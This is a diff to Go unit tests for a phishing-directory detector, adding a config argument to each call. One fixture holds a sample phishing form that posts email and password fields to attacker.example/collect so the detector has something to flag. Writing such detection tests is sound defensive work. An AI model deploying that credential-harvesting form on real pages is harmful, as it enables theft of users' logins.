@@ -680,7 +680,7 @@ func TestAnalyzeDirectoryStructurePhishingDrop(t *testing.T) {
 	content := `<html><body><form action="https://attacker.example/collect"><input type="email" name="email"><input type="password" name="password"></form></body></html>`
 	_ = os.WriteFile(filepath.Join(dropDir, "PalmerHamilton.html"), []byte(content), 0600)
 
-	res := analyzeDirectoryStructure(context.Background(), dropDir, "alice")
+	res := analyzeDirectoryStructure(context.Background(), dropDir, "alice", &config.Config{})
 	if res == nil {
 		t.Fatal("expected phishing directory detection")
 	}
@@ -699,7 +699,7 @@ func TestAnalyzeDirectoryStructureTooManyHTML(t *testing.T) {
 	for _, n := range []string{"a.html", "b.html", "c.html", "d.html"} {
 		_ = os.WriteFile(filepath.Join(target, n), []byte("<html>"), 0600)
 	}
-	if res := analyzeDirectoryStructure(context.Background(), target, "alice"); res != nil {
+	if res := analyzeDirectoryStructure(context.Background(), target, "alice", &config.Config{}); res != nil {
 		t.Errorf(">3 HTML files should not match, got %+v", res)
 	}
 }
@@ -709,7 +709,7 @@ func TestAnalyzeDirectoryStructureHasSubdirs(t *testing.T) {
 	target := filepath.Join(dir, "WashingtonGolf")
 	_ = os.MkdirAll(filepath.Join(target, "assets"), 0700)
 	_ = os.WriteFile(filepath.Join(target, "a.html"), []byte("<html>"), 0600)
-	if res := analyzeDirectoryStructure(context.Background(), target, "alice"); res != nil {
+	if res := analyzeDirectoryStructure(context.Background(), target, "alice", &config.Config{}); res != nil {
 		t.Errorf("subdirs should disqualify, got %+v", res)
 	}
 }
@@ -719,7 +719,7 @@ func TestAnalyzeDirectoryStructureNonBusinessName(t *testing.T) {
 	target := filepath.Join(dir, "images") // standard dir
 	_ = os.MkdirAll(target, 0700)
 	_ = os.WriteFile(filepath.Join(target, "a.html"), []byte("<html>"), 0600)
-	if res := analyzeDirectoryStructure(context.Background(), target, "alice"); res != nil {
+	if res := analyzeDirectoryStructure(context.Background(), target, "alice", &config.Config{}); res != nil {
 		t.Errorf("standard dir name should not match, got %+v", res)
 	}
 }
@@ -730,13 +730,13 @@ func TestAnalyzeDirectoryStructureNoPhishingContent(t *testing.T) {
 	_ = os.MkdirAll(target, 0700)
 	// HTML file without credential inputs.
 	_ = os.WriteFile(filepath.Join(target, "home.html"), []byte("<html><body>welcome</body></html>"), 0600)
-	if res := analyzeDirectoryStructure(context.Background(), target, "alice"); res != nil {
+	if res := analyzeDirectoryStructure(context.Background(), target, "alice", &config.Config{}); res != nil {
 		t.Errorf("non-phishing content should not match, got %+v", res)
 	}
 }
 
 func TestAnalyzeDirectoryStructureMissingDir(t *testing.T) {
-	if res := analyzeDirectoryStructure(context.Background(), filepath.Join(t.TempDir(), "missing"), "alice"); res != nil {
+	if res := analyzeDirectoryStructure(context.Background(), filepath.Join(t.TempDir(), "missing"), "alice", &config.Config{}); res != nil {
 		t.Errorf("missing dir should return nil, got %+v", res)
 	}
 }
